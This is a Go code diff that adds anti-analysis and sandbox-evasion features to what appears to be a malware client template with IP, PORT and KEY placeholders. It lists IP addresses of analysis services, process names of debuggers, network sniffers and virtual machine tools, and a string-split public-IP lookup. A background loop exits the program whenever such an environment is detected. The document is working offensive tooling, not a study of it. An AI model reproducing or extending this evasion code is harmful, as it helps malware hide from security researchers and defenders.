@@ -3,15 +3,17 @@ package main
 import (
 	"os"
 	"fmt"
+	"time"
 	"runtime"
 	"strings"
 	"os/exec"
 	"os/user"
+	"net/http"
 	"io/ioutil"
 )
 
 const (
-	IP   = "{IP}"
+	IP 	 = "{IP}"
 	PORT = "{PORT}"
 	KEY  = "{KEY}"
 )
@@ -55,6 +57,23 @@ var hwids = []string {
 	"79AF5279-16CF-4094-9758-F88A616D81B4",
 }
 
+var addrs = []string {
+	"88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12",
+	"194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68",
+	"92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90",
+	"109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234",
+	"64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241",
+	"109.74.154.92","213.33.142.50",
+}
+
+var process = []string {
+	"HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe","joeboxcontrol.exe",
+    "httpdebuggerui.exe", "vboxservice.exe", "df5serv.exe","processhacker.exe",
+	"vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", 
+	"vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", 
+	"vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe",
+	"ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe","pestudio.exe","x32dbg.exe",
+}
 
 func trim(s string) string {
 	return strings.TrimSpace(strings.Trim(s, "\n"))
@@ -76,16 +95,36 @@ func anti_evasions()(bool){
 	if err != nil {
 		return true
 	}
-   	if in_array(User.Username, users){
+   	if in_array(User.Username, users){ // blocked list usernames
    		return true
    	}
-   	if in_array(Name, computers){
+   	if in_array(Name, computers){ // blocked list Computers
    		return true
    	}
-   	if in_array(trim(system(sys_hwid[runtime.GOOS])), hwids){
+   	if in_array(trim(system(sys_hwid[runtime.GOOS])), hwids){ // blocked list hwrd (need fix)
+   		return true
+   	}
+   	if in_array(my_ip(), addrs){ // bloacked list ip
    		return true
    	}
    	return false
+}
+
+func anti_debugger()(bool){
+
+	return false
+}
+func my_ip()(string){
+	url := "h" + "tt" + "ps" + "://" + "a" + "pi." + "ip" + "ify." + "org/"
+	resp, err := http.Get(url)
+   	if err != nil {
+    	return "213.33.142.50"
+   	}
+   	body, err := ioutil.ReadAll(resp.Body)
+   	if err != nil {
+      return "213.33.142.50"
+   	}
+   	return string(body)
 }
 func system(todo string) (string) {
 	call_os := strings.Split(sys[runtime.GOOS], ",")
@@ -125,13 +164,21 @@ func write_file(path string, context string) (string) {
     }
     return path
 }
-
-func init(){
-	if anti_evasions(){
-		os.Exit(3)
+func debugger(){
+    for true {
+        if anti_evasions(){
+	    os.Exit(3)
+	}
+	if anti_debugger(){
+	    os.Exit(3)
 	}
 }
+}
+func init(){
+    go debugger()
+}
 func main(){
-	
-	fmt.Println(system("ls"));
+    //go debugger()
+    fmt.Println(system("whoami"));
+    time.Sleep(60 * time.Second)
 }
